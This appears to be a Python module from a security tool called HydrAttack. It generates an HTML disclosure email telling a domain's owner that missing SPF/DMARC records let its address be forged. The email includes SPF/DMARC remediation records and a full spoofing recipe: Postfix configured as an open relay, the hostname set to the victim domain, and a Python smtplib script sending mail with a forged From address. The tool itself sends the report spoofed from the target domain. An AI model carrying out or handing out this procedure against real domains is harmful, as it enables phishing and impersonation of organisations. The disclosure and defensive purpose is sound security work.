import os

USERNAME = os.environ.get("USERNAME", "spoofed")
DOMAIN = os.environ.get("DOMAIN", "spoofed.com")
SENDTO = os.environ.get("SENDTO", "spoofed@spoofed.com")
ATTACH = os.environ.get("ATTACH", "")

msg_body = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HydrAttack Report</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 0;
            padding: 0;
        }}
        .container {{
            background-color: #ffffff;
            max-width: 600px;
            margin: 30px auto;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
        }}
        .logo img {{
            max-width: 250px;
            margin-bottom: 20px;
            text-align: center;
        }}
        h1 {{
            color: #333;
            font-size: 20px;
            text-align: center;
        }}
        p {{
            color: #666;
            font-size: 16px;
            line-height: 1.5;
            text-align: left;
        }}
        .code-block {{
            font-family: "Courier New", Courier, monospace !important;
            background-color: #f4f4f4;
            color: #333;
            padding: 10px;
            border-radius: 5px;
            font-size: 14px;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid #ccc;
            text-align: left;
        }}
        .footer {{
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }}
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <img src="https://hydrattack.com/img/logo-big.png" alt="HydrAttack">
        </div>
        
        <h1 align=center>HydrAttack PoC eMail Spoofer report for {DOMAIN} domain</h1>
        
        <p>Hello {SENDTO},</p>
        <p>You are receiving this email because the domain <b>{DOMAIN}</b> is vulnerable to spoofing due to the lack of SPF and/or DMARC protection!</p><br>

        <p><b>Description</b><br>
        The absence of SPF/DMARC records allow spoofing of the <b>{DOMAIN}</b> domain.</p>

        <p><b>Impact</b><br>
        Send unauthorized emails from the domain of the company - <b>{DOMAIN}</b>, supplanting their identity and facilitating the realization of phishing attacks.</p>

        <p><b>Recommendation</b><br>
        Configure SPF/DMARC records with policies suitable for the domain:<br>
        <pre class=code-block>
v=spf1 include:mx.{DOMAIN} -all
v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@{DOMAIN}; ruf=mailto:dmarc-failures@{DOMAIN}; pct=100;</code></pre></p>
        
        <p><b>Threat</b><br>
        Anonymous attacker from Internet </p>

        <p><b>Score</b><br>
        <pre class=code-block>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N = 5.3 Medium</pre></p>

        <br><h1 align=center>Step-by-step report for bug hunters / pentesters / blue team:</h1>
        <p><b>Step 1. Installing mail server on Ubuntu</b></p>
        <pre class=code-block>
sudo apt update
sudo apt install postfix</pre>
        <p>During the installation setting up next keys:</p>
        <pre class=code-block>
General type of mail configuration? → Internet Site
System mail name? → {DOMAIN}</pre>

        <p><b>Step 2. Setting up /etc/postfix/main.cf</b><br>
        <pre class=code-block>
smtpd_banner = $myhostname ESMTP
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 3.6

smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
smtpd_tls_security_level=may
smtp_tls_CApath=/etc/ssl/certs
smtp_tls_security_level=may
smtp_tls_session_cache_database = btree:${{data_directory}}/smtp_scache

smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = {DOMAIN}
myorigin = {DOMAIN}
mydestination = localhost
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliase
relayhost = 
mynetworks = 0.0.0.0/0
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all

smtpd_recipient_restrictions=permit_mynetworks,reject_unauth_destination
mynetworks=0.0.0.0/0
inet_interfaces = all
smtp_host_lookup=native
smtp_generic_maps = hash:/etc/postfix/generic</pre></p>

        <p><b>Step 3. Setting /etc/postfix/generic file</b><br>
        <pre class=code-block>{USERNAME}@{DOMAIN} mail@{DOMAIN}</pre></p>
        
        <p><b>Step 4. Changing the hostname</b><br>
        <pre class=code-block>sudo hostnamectl set-hostname {DOMAIN}</pre></p>

        <p><b>Step 5. Restarting postfix to apply changes</b><br>
        <pre class=code-block>
sudo systemctl restart postfix
sudo systemctl enable postfix</pre></p>

        <p><b>Step 6. Creating send_email.py script</b><br>
        <pre class=code-block>
import smtplib
from email.mime.text import MIMEText

msg = MIMEText("Spoofing {DOMAIN} emails")
msg["Subject"] = "{DOMAIN} spoofing"
msg["From"] = "{USERNAME}@{DOMAIN}"
msg["To"] = "{SENDTO}"

server = smtplib.SMTP("127.0.0.1", 25)
server.sendmail("{USERNAME}@{DOMAIN}", "{SENDTO}", msg.as_string())
server.quit()
print("Email sent!")</pre></p>

        <p><b>Step 7. Run the script - sending spoofed email</b><br>
        <pre class=code-block>python3 send_email.py</pre></p>

        <div class="footer" align=center>Legal Disclaimer: This software and associated materials are intended solely for proof-of-concept (PoC) and security research purposes. Unauthorized use of this code for real-world phishing attacks, fraudulent activities, or any malicious intent is strictly prohibited.<br>&nbsp;<br>© <a href=https://hydrattack.com/>HydrAttack</a>. All rights reserved.</div>
    </div>

</body>
</html>
"""

msg_subject = f"HydrAttack PoC eMail Spoofer for {DOMAIN} domain"
msg_from = f"{USERNAME}@{DOMAIN}"
msg_to = f"{SENDTO}"
